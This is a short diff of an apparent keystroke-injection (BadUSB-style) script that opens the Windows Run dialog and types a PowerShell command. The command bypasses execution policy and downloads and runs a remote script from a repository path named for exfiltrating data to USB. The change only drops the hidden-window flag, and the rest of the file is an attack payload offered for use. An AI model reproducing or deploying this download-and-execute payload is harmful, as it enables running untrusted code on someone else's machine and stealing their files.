@@ -10,6 +10,6 @@ layout("us")
 delay(1000);
 press("GUI r");
 delay(1000);
-type("powershell -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Exfiltrate-to-USB/main.ps1 | iex");
+type("powershell -NoP -Ep Bypass -C irm https://raw.githubusercontent.com/beigeworm/PwnPi-Scripts/main/Fast-Execution/Exfiltrate-to-USB/main.ps1 | iex");
 delay(500);
 press("ENTER");
